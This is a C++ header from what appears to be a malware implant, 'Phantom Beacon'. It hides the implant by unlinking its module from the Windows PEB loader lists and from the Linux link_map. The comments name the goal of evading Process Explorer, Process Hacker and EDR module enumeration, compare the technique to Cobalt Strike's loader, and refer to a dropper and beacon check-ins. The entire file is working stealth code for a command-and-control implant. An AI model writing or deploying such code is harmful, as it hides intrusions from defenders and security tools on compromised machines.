#pragma once
// ============================================================================
//  peb_unlink.h — Phantom Beacon PEB Module Unlink
//  ──────────────────────────────────────────────────────────────────
//  Removes the beacon's own module entry from the PEB's three module
//  lists (InLoadOrder, InMemoryOrder, InInitializationOrder). Tools that
//  enumerate loaded modules via the PEB (Process Hacker, Process Explorer,
//  and many EDR "module walking" heuristics) no longer see the beacon.
//
//  The module stays mapped and executing — only the linked-list bookkeeping
//  is severed. This is the same technique Cobalt Strike's reflective loader
//  uses to make an injected DLL invisible.
//
//  NOTE: The entry is unlinked by patching the Flink/Blink pointers of the
//  neighbouring entries. We never free or unmount anything, so no memory
//  corruption occurs; if the process later calls LdrLoadDll on something,
//  the lists remain structurally valid for other modules.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include "evasion.h"

namespace peb_unlink {

// Forward-declare list-entry helpers (LIST_ENTRY uses Flink/Blink).
// We work with the raw offsets to avoid depending on ntdll symbols.

/// Unlink the current module from the PEB's InMemoryOrderModuleList.
/// Returns true if the module was found and unlinked.
inline bool unlink_from_memory_order() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (!peb || !peb->Ldr) return false;

    // REAL x64 PEB_LDR_DATA layout (verified live 2026-10-17):
    //   +0x00 Length (ULONG)   +0x04 Initialized   +0x08 SsHandle
    //   +0x10 InLoadOrderModuleList
    //   +0x20 InMemoryOrderModuleList
    //   +0x30 InInitializationOrderModuleList
    // LIVE BUG (2026-10-17, this host): the heads used to be read at
    // +0x18/+0x28/+0x38 — 8 bytes PAST each real list head — so the walk
    // crossed the real head (e != head was never true: the sentinel sat 8
    // bytes too high) and cycled the list forever: 100% CPU, no check-in,
    // reproducible in the dropper AND in the anti-probe harness. The
    // termination now has a hard iteration cap plus a self-loop break, so
    // no future layout mistake can hang the beacon again.
    auto ldr = peb->Ldr;
    auto* head = reinterpret_cast<PLIST_ENTRY>(
        reinterpret_cast<uint8_t*>(ldr) + 0x20);

    // Find our own module entry. The InMemoryOrderLinks field sits at
    // offset 0x10 into the LDR_DATA_TABLE_ENTRY (for the memory-order list).
    // We identify "ours" by strict containment inside a registered image.
    uintptr_t ourBase = reinterpret_cast<uintptr_t>(&unlink_from_memory_order);

    PLIST_ENTRY e = head->Flink;
    for (int guard = 0; e != head && guard < 4096; ++guard, e = e->Flink) {
        // LDR_DATA_TABLE_ENTRY* = entry - 0x10 (InMemoryOrderLinks offset)
        auto* entry = reinterpret_cast<uint8_t*>(e) - 0x10;
        // DllBase is at +0x30, SizeOfImage (ULONG) at +0x40
        uintptr_t dllBase = *reinterpret_cast<uintptr_t*>(entry + 0x30);
        uint32_t imageSize = *reinterpret_cast<uint32_t*>(entry + 0x40);

        // Strict containment: only OUR OWN registered image may match. The
        // old "within 1 GB below the base" heuristic could unlink a STRANGER
        // module; and for an in-memory payload (never registered as a
        // module) the correct answer is "not listed" -> no unlink at all.
        if (dllBase && imageSize && ourBase >= dllBase &&
            ourBase < dllBase + imageSize) {
            // Unlink: Flink->Blink = Blink; Blink->Flink = Flink
            PLIST_ENTRY flink = e->Flink;
            PLIST_ENTRY blink = e->Blink;
            flink->Blink = blink;
            blink->Flink = flink;
            // Break our own links (not strictly required, but hygienic)
            e->Flink = e;
            e->Blink = e;
            return true;
        }
        if (e->Flink == e) break;  // corrupted list: never spin
    }
    return false;
}

/// Unlink the current module from the InLoadOrderModuleList.
inline bool unlink_from_load_order() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (!peb || !peb->Ldr) return false;

    auto ldr = peb->Ldr;
    auto* head = reinterpret_cast<PLIST_ENTRY>(
        reinterpret_cast<uint8_t*>(ldr) + 0x10);  // real InLoadOrder head

    uintptr_t ourBase = reinterpret_cast<uintptr_t>(&unlink_from_load_order);

    PLIST_ENTRY e = head->Flink;
    for (int guard = 0; e != head && guard < 4096; ++guard, e = e->Flink) {
        // InLoadOrderLinks is at offset 0x00 of LDR_DATA_TABLE_ENTRY
        auto* entry = reinterpret_cast<uint8_t*>(e) - 0x00;
        uintptr_t dllBase = *reinterpret_cast<uintptr_t*>(entry + 0x30);
        uint32_t imageSize = *reinterpret_cast<uint32_t*>(entry + 0x40);

        if (dllBase && imageSize && ourBase >= dllBase &&
            ourBase < dllBase + imageSize) {
            PLIST_ENTRY flink = e->Flink;
            PLIST_ENTRY blink = e->Blink;
            flink->Blink = blink;
            blink->Flink = flink;
            e->Flink = e;
            e->Blink = e;
            return true;
        }
        if (e->Flink == e) break;  // corrupted list: never spin
    }
    return false;
}

/// Unlink the current module from the InInitializationOrderModuleList.
inline bool unlink_from_init_order() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (!peb || !peb->Ldr) return false;

    auto ldr = peb->Ldr;
    auto* head = reinterpret_cast<PLIST_ENTRY>(
        reinterpret_cast<uint8_t*>(ldr) + 0x30);  // real InInitOrder head

    uintptr_t ourBase = reinterpret_cast<uintptr_t>(&unlink_from_init_order);

    PLIST_ENTRY e = head->Flink;
    for (int guard = 0; e != head && guard < 4096; ++guard, e = e->Flink) {
        // InInitializationOrderLinks is at offset 0x20 of LDR_DATA_TABLE_ENTRY
        auto* entry = reinterpret_cast<uint8_t*>(e) - 0x20;
        uintptr_t dllBase = *reinterpret_cast<uintptr_t*>(entry + 0x30);
        uint32_t imageSize = *reinterpret_cast<uint32_t*>(entry + 0x40);

        if (dllBase && imageSize && ourBase >= dllBase &&
            ourBase < dllBase + imageSize) {
            PLIST_ENTRY flink = e->Flink;
            PLIST_ENTRY blink = e->Blink;
            flink->Blink = blink;
            blink->Flink = flink;
            e->Flink = e;
            e->Blink = e;
            return true;
        }
        if (e->Flink == e) break;  // corrupted list: never spin
    }
    return false;
}

/// Unlink the beacon module from all three PEB module lists.
/// Safe to call once at startup (idempotent).
inline void hide_module() {
    unlink_from_memory_order();
    unlink_from_load_order();
    unlink_from_init_order();
}

}  // namespace peb_unlink
#else
// ============================================================================
//  peb_unlink.h — POSIX (Linux / macOS) module hiding
//  ──────────────────────────────────────────────────────────────────
//  There is no PEB on POSIX; the equivalent bookkeeping is the dynamic
//  loader's link_map — the doubly-linked list glibc walks for
//  dl_iterate_phdr(). On Linux we unlink the module that contains
//  hide_module() from that list, so a tool enumerating loaded objects no
//  longer sees it. The mapping stays valid: only the list links are severed
//  (identical intent to the PEB unlink above). macOS's dyld image list is
//  not writable through any public API, so there hide_module() is a
//  documented no-op.
// ============================================================================
#include <cstdint>

// struct link_map / _r_debug are exposed by glibc and musl's <link.h>; Apple's
// dyld and Android's bionic do NOT provide them, so the unlink compiles only
// where it exists and degrades to a documented no-op elsewhere.
#if !defined(__APPLE__) && !defined(__ANDROID__) && defined(__linux__)
    #define PHANTOM_HAVE_LINK_MAP 1
    #include <link.h>
    #include <dlfcn.h>
#else
    #define PHANTOM_HAVE_LINK_MAP 0
#endif

namespace peb_unlink {

#if PHANTOM_HAVE_LINK_MAP
// _r_debug.r_map is the head of glibc's link_map list. Match our own object by
// its load bias (l_addr) and unlink it, then blank l_name so the path no
// longer appears either.
inline bool hide_module() {
    uintptr_t self_base = 0;
    dl_iterate_phdr([](struct dl_phdr_info* info, size_t, void* data) -> int {
        uintptr_t fn = reinterpret_cast<uintptr_t>(&hide_module);
        for (int i = 0; i < info->dlpi_phnum; ++i) {
            const ElfW(Phdr)& ph = info->dlpi_phdr[i];
            if (ph.p_type != PT_LOAD) continue;
            uintptr_t lo = info->dlpi_addr + ph.p_vaddr;
            if (fn >= lo && fn < lo + ph.p_memsz) {
                *reinterpret_cast<uintptr_t*>(data) = info->dlpi_addr;
                return 1;
            }
        }
        return 0;
    }, &self_base);
    if (!self_base) return false;

    for (struct link_map* m = _r_debug.r_map; m; m = m->l_next) {
        if (m->l_addr == self_base) {
            if (m->l_prev) m->l_prev->l_next = m->l_next;
            if (m->l_next) m->l_next->l_prev = m->l_prev;
            m->l_name = const_cast<char*>("");
            return true;
        }
    }
    return false;
}
#else
// macOS dyld list and Android bionic expose no writable link_map.
inline bool hide_module() { return false; }
#endif

}  // namespace peb_unlink
#endif
